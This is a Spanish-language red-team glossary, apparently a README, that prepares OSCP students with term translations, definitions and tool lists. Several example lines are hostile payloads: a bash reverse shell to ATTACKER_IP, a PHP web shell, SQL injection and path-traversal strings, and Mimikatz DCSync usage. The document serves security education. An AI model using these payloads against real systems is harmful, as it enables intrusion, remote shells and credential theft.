# red-team-glossary
Glosario Red Team orientado a OSCP
Inglés → Español con definiciones y ejemplos
Este glosario está orientado a estudiantes y profesionales que se preparan para certificaciones técnicas como eJPT y OSCP, con foco en hacking ético, pruebas de penetración y Red Team. Cada entrada incluye traducción, una definición breve y, cuando es útil, un ejemplo de uso o herramientas relacionadas.
Port Scanning → Escaneo de puertos  [Networking / Recon]
Definición: Proceso de enviar paquetes a una serie de puertos en un host para identificar qué servicios están abiertos o filtrados.
Ejemplo: Ejemplo: Ejecutar 'nmap -sS -p- 10.10.10.10' para descubrir servicios expuestos.
Herramientas relacionadas: Nmap, Masscan

Service Enumeration → Enumeración de servicios  [Networking / Recon]
Definición: Fase en la que se obtienen detalles específicos de los servicios descubiertos, como versión, opciones activas y banners.
Ejemplo: Ejemplo: Usar 'nmap -sV -sC' para obtener información de versión y scripts por defecto.
Herramientas relacionadas: Nmap, Netcat, Telnet, OpenSSL

Banner Grabbing → Obtención de banners  [Networking / Recon]
Definición: Técnica para leer mensajes iniciales que envía un servicio, revelando a menudo el tipo y versión del software.
Ejemplo: Ejemplo: Conectarse por netcat a un puerto 80 y enviar 'HEAD / HTTP/1.0' para ver el banner de un servidor web.
Herramientas relacionadas: Netcat, Nmap, Curl, Telnet

TCP SYN Scan → Escaneo SYN TCP  [Networking / Recon]
Definición: Escaneo que envía paquetes SYN y analiza las respuestas para determinar el estado de los puertos sin completar el handshake.
Ejemplo: Ejemplo: 'nmap -sS 192.168.1.10' para un escaneo sigiloso en modo SYN.
Herramientas relacionadas: Nmap

UDP Scan → Escaneo UDP  [Networking / Recon]
Definición: Escaneo que envía datagramas UDP para identificar servicios no orientados a conexión; suele ser más lento y menos fiable.
Ejemplo: Ejemplo: 'nmap -sU 10.10.10.10 -p 53,161,500' para buscar DNS, SNMP o IKE.
Herramientas relacionadas: Nmap, Masscan

Firewall Evasion → Evasión de cortafuegos  [Networking / Evasion]
Definición: Uso de técnicas para sortear o confundir reglas de firewall, como fragmentación, cambio de puertos o uso de proxies.
Ejemplo: Ejemplo: Emplear 'nmap -f' para fragmentar paquetes al escanear un objetivo protegido.
Herramientas relacionadas: Nmap, Proxychains, Chisel, Socat

Input Validation → Validación de entrada  [Web Security]
Definición: Comprobación de datos enviados por el usuario para evitar que contenido malicioso llegue a la lógica de la aplicación.
Ejemplo: Ejemplo: Validar que un campo numérico solo acepte dígitos y no código JavaScript o SQL.

SQL Injection (SQLi) → Inyección SQL  [Web Exploitation]
Definición: Vulnerabilidad que ocurre cuando la entrada del usuario se inserta sin protección en consultas SQL, permitiendo manipular la base de datos.
Ejemplo: Ejemplo: Usar ' OR 1=1 -- para bypassear una autenticación vulnerable.
Herramientas relacionadas: SQLMap, Burp Suite, Manual payloads

Error-Based SQL Injection → Inyección SQL basada en errores  [Web Exploitation]
Definición: Tipo de SQLi donde la aplicación muestra mensajes de error detallados que revelan información de la base de datos.
Ejemplo: Ejemplo: Forzar un error con funciones como updatexml() en MySQL para filtrar datos.
Herramientas relacionadas: SQLMap, Burp Suite

Blind SQL Injection → Inyección SQL ciega  [Web Exploitation]
Definición: SQLi donde no se muestran errores ni resultados directos, pero el atacante deduce información por cambios en respuestas o tiempos.
Ejemplo: Ejemplo: Enviar payloads booleanos y analizar si la página responde de forma diferente.
Herramientas relacionadas: SQLMap, Burp Suite Intruder

Union-Based SQL Injection → Inyección SQL por UNION  [Web Exploitation]
Definición: SQLi que aprovecha la cláusula UNION para combinar resultados controlados por el atacante con consultas legítimas.
Ejemplo: Ejemplo: 'UNION SELECT username, password FROM users' para extraer credenciales.
Herramientas relacionadas: SQLMap, Manual exploitation

Cross-Site Scripting (XSS) → Scripts entre sitios (XSS)  [Web Exploitation]
Definición: Vulnerabilidad que permite inyectar código JavaScript en páginas vistas por otros usuarios.
Ejemplo: Ejemplo: Inyectar '<script>alert(1)</script>' en un campo de comentario vulnerable.
Herramientas relacionadas: Burp Suite, XSS Hunter, Manual payloads

Stored XSS → XSS almacenado  [Web Exploitation]
Definición: Tipo de XSS donde el payload se guarda en el servidor y se ejecuta cada vez que otros usuarios visitan el contenido.
Ejemplo: Ejemplo: Dejar un comentario malicioso que ejecuta JS al ser visto por un administrador.

Reflected XSS → XSS reflejado  [Web Exploitation]
Definición: XSS donde el payload se envía en la petición y se refleja inmediatamente en la respuesta.
Ejemplo: Ejemplo: Un enlace de phishing con un parámetro malicioso en la URL.

DOM-Based XSS → XSS basado en DOM  [Web Exploitation]
Definición: XSS que se ejecuta completamente en el lado del cliente mediante manipulación del DOM, sin pasar por el servidor.
Ejemplo: Ejemplo: Un script que lee fragmentos de la URL y los escribe en el DOM sin sanitizar.
Herramientas relacionadas: Burp Suite, Browser DevTools

Cross-Site Request Forgery (CSRF) → Falsificación de petición en sitios cruzados (CSRF)  [Web Exploitation]
Definición: Ataque que fuerza a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web.
Ejemplo: Ejemplo: Hacer que un usuario haga clic en un enlace que realiza una transferencia de dinero sin su intención.
Herramientas relacionadas: Burp Suite, OWASP ZAP

Insecure Direct Object Reference (IDOR) → Referencia directa insegura a objetos (IDOR)  [Web Exploitation]
Definición: Vulnerabilidad donde se accede a recursos cambiando identificadores en parámetros sin controles de autorización adecuados.
Ejemplo: Ejemplo: Cambiar 'user_id=100' por 'user_id=101' y ver datos de otra cuenta.

Server-Side Request Forgery (SSRF) → Falsificación de solicitud del lado del servidor (SSRF)  [Web Exploitation]
Definición: Ataque donde la aplicación es inducida a realizar peticiones HTTP hacia recursos internos o externos controlados.
Ejemplo: Ejemplo: Usar un parámetro de URL para hacer que el servidor consulte 'http://127.0.0.1:8080/admin'.
Herramientas relacionadas: Burp Suite, SSRFmap

Directory Traversal → Recorrido de directorios  [Web Exploitation]
Definición: Vulnerabilidad que permite acceder a archivos fuera del directorio esperado usando rutas relativas.
Ejemplo: Ejemplo: Enviar '../../../../etc/passwd' en un parámetro de nombre de archivo.

File Upload Vulnerability → Vulnerabilidad de subida de archivos  [Web Exploitation]
Definición: Condición donde un atacante puede subir archivos peligrosos (como webshells) por una función de carga sin validación suficiente.
Ejemplo: Ejemplo: Subir 'shell.php' cambiando la extensión o el tipo MIME para evadir filtros.
Herramientas relacionadas: Burp Suite, ExifTool

Reverse Shell → Shell reversa  [Post-Exploitation]
Definición: Conexión donde la máquina objetivo se conecta de vuelta al atacante, otorgando una consola remota.
Ejemplo: Ejemplo: Usar 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' para obtener una shell.
Herramientas relacionadas: Netcat, Socat, msfvenom

Bind Shell → Shell con puerto ligado  [Post-Exploitation]
Definición: Shell que escucha en un puerto de la máquina víctima y espera una conexión del atacante.
Ejemplo: Ejemplo: Ejecutar un listener en la víctima y conectar desde el host atacante con netcat.
Herramientas relacionadas: Netcat, Socat

Web Shell → Webshell  [Post-Exploitation]
Definición: Script cargado en un servidor web que permite ejecutar comandos en el sistema a través de peticiones HTTP.
Ejemplo: Ejemplo: Un archivo PHP que hace 'system($_GET["cmd"])'.
Herramientas relacionadas: Weevely, China Chopper (histórico)

Privilege Escalation → Escalada de privilegios  [Post-Exploitation]
Definición: Proceso de pasar de un usuario con privilegios bajos a uno de mayores permisos, como root o administrador.
Ejemplo: Ejemplo: Abusar de un servicio mal configurado para obtener permisos de SYSTEM en Windows.
Herramientas relacionadas: LinPEAS, WinPEAS, GTFOBins, Windows Exploit Suggester

Local Privilege Escalation → Escalada local de privilegios  [Post-Exploitation]
Definición: Escalada que ocurre una vez el atacante ya tiene acceso a la máquina, aprovechando vulnerabilidades locales.
Ejemplo: Ejemplo: Exploitar un binario SUID mal configurado para obtener root en Linux.

Lateral Movement → Movimiento lateral  [Post-Exploitation]
Definición: Técnicas usadas para moverse desde una máquina comprometida hacia otras dentro de la misma red.
Ejemplo: Ejemplo: Usar credenciales robadas para conectarse por WinRM a otros servidores.
Herramientas relacionadas: Impacket, Evil-WinRM, PsExec

Persistence → Persistencia  [Post-Exploitation]
Definición: Mecanismos que garantizan que el atacante mantenga acceso al sistema incluso después de reinicios o cambios.
Ejemplo: Ejemplo: Crear una tarea programada que ejecute un payload en cada inicio de sesión.
Herramientas relacionadas: Metasploit, reg.exe, schtasks.exe

Active Directory → Directorio Activo  [Active Directory]
Definición: Servicio de directorio de Microsoft que gestiona usuarios, equipos, grupos y políticas en entornos Windows.
Ejemplo: Ejemplo: Un dominio 'corp.local' con varios controladores de dominio y cientos de usuarios.

Domain Controller (DC) → Controlador de dominio  [Active Directory]
Definición: Servidor que ejecuta Active Directory y maneja autenticación, políticas y replicación en el dominio.
Ejemplo: Ejemplo: 'dc01.corp.local' validando logins de todos los usuarios.

Domain Admins → Administradores del dominio  [Active Directory]
Definición: Grupo con máximos privilegios en el dominio, capaz de controlar usuarios, equipos y políticas.
Ejemplo: Ejemplo: Comprometer una cuenta de Domain Admin suele ser objetivo final en un ataque de AD.

Kerberos → Kerberos  [Active Directory]
Definición: Protocolo de autenticación basado en tickets usado por Active Directory para autenticar usuarios y servicios.
Ejemplo: Ejemplo: Al iniciar sesión en un dominio, el usuario obtiene tickets Kerberos para acceder a recursos.

NTLM Authentication → Autenticación NTLM  [Active Directory]
Definición: Protocolo de autenticación de Microsoft más antiguo que Kerberos, aún presente en muchos entornos.
Ejemplo: Ejemplo: Un servicio que acepta autenticación NTLM puede ser vulnerable a relay o captura de hashes.
Herramientas relacionadas: Responder, Impacket ntlmrelayx.py

Kerberoasting → Kerberoasting  [Active Directory]
Definición: Ataque contra cuentas de servicio donde se solicitan tickets de servicio cifrados para crackear sus hashes offline.
Ejemplo: Ejemplo: Ejecutar GetUserSPNs.py y luego usar Hashcat para romper contraseñas de cuentas de servicio.
Herramientas relacionadas: Impacket, Rubeus, Hashcat

AS-REP Roasting → AS-REP Roasting  [Active Directory]
Definición: Ataque que explota cuentas que no requieren preautenticación Kerberos, permitiendo obtener hashes directamente del KDC.
Ejemplo: Ejemplo: Usar 'GetNPUsers.py' para recuperar hashes de cuentas vulnerables.
Herramientas relacionadas: Impacket, Hashcat, Rubeus

Pass-the-Hash (PtH) → Pass-the-Hash  [Active Directory / Post-Exploitation]
Definición: Técnica que reutiliza hashes de contraseñas en lugar de contraseñas en texto claro para autenticarse.
Ejemplo: Ejemplo: Usar un hash NTLM con wmiexec.py para ejecutar comandos en un host remoto.
Herramientas relacionadas: Impacket, Mimikatz, Evil-WinRM

Pass-the-Ticket (PtT) → Pass-the-Ticket  [Active Directory / Post-Exploitation]
Definición: Ataque en el que se reutilizan tickets Kerberos robados para acceder a recursos sin conocer la contraseña.
Ejemplo: Ejemplo: Inyectar un ticket TGT con Mimikatz para hacerse pasar por otro usuario.
Herramientas relacionadas: Mimikatz, Rubeus

DCSync Attack → Ataque DCSync  [Active Directory / Post-Exploitation]
Definición: Técnica que abusa de privilegios de replicación de dominio para solicitar hashes de todos los usuarios desde un DC.
Ejemplo: Ejemplo: Ejecutar 'lsadump::dcsync' en Mimikatz para extraer el hash de KRBTGT.
Herramientas relacionadas: Mimikatz, Impacket secretsdump.py

OSCP Exam → Examen OSCP  [Certifications]
Definición: Examen práctico de 24 horas de Offensive Security que evalúa habilidades reales de pentesting en entornos Linux y Windows.
Ejemplo: Ejemplo: Explotar múltiples máquinas, documentar pasos y enviar un informe profesional.
Herramientas relacionadas: Kali Linux, Nmap, Burp Suite, scripts propios

Proof of Concept (PoC) → Prueba de concepto  [Reporting]
Definición: Demostración técnica mínima de que una vulnerabilidad puede ser explotada.
Ejemplo: Ejemplo: Script que muestra cómo se puede hacer RCE usando un parámetro vulnerable.

Exploit Development → Desarrollo de exploits  [Exploitation]
Definición: Proceso de crear o adaptar código de explotación para aprovechar vulnerabilidades específicas.
Ejemplo: Ejemplo: Ajustar un exploit de buffer overflow para una versión concreta de software.
Herramientas relacionadas: Python, pwntools, Immunity Debugger, GDB

Buffer Overflow → Desbordamiento de búfer  [Exploitation]
Definición: Vulnerabilidad de memoria donde datos exceden el espacio asignado y sobrescriben direcciones o estructuras críticas.
Ejemplo: Ejemplo: En OSCP se practica explotando un servicio vulnerable para obtener ejecución de código.
Herramientas relacionadas: GDB, Immunity Debugger, Mona, pwntools

Return-Oriented Programming (ROP) → Programación orientada al retorno (ROP)  [Exploitation]
Definición: Técnica de explotación que reutiliza fragmentos de código existente (gadgets) para construir una cadena maliciosa.
Ejemplo: Ejemplo: Encadenar gadgets para llamar a system('/bin/sh') sin inyectar código nuevo.
Herramientas relacionadas: ROPgadget, Ropper, pwntools

Shellcode → Shellcode  [Exploitation]
Definición: Código máquina pequeño diseñado para ejecutarse como payload y normalmente abrir una shell o realizar tareas específicas.
Ejemplo: Ejemplo: Usar msfvenom para generar shellcode x86 que se inyecta en un proceso vulnerable.
Herramientas relacionadas: msfvenom, nasm, pwntools

Executive Summary → Resumen ejecutivo  [Reporting]
Definición: Sección del informe que explica en lenguaje no técnico los riesgos y hallazgos más relevantes para la dirección.
Ejemplo: Ejemplo: Describir que un atacante podría obtener acceso completo a datos críticos sin hablar de payloads específicos.

Technical Findings → Hallazgos técnicos  [Reporting]
Definición: Parte del informe donde se describen vulnerabilidades, evidencias, pasos de explotación y remediaciones detalladas.
Ejemplo: Ejemplo: Documentar una inyección SQL con parámetros, capturas de pantalla y comandos utilizados.

Severity Rating → Clasificación de severidad  [Reporting]
Definición: Sistema para priorizar vulnerabilidades según impacto y probabilidad, a menudo basado en CVSS.
Ejemplo: Ejemplo: Marcar una RCE no autenticada como 'Crítica' y una enumeración de usuarios como 'Baja'.
Herramientas relacionadas: CVSS Calculator

Proof of Exploitation → Prueba de explotación  [Reporting]
Definición: Evidencia que confirma que una vulnerabilidad fue explotada con éxito.
Ejemplo: Ejemplo: Capturas de pantalla mostrando una shell como NT AUTHORITY\SYSTEM.

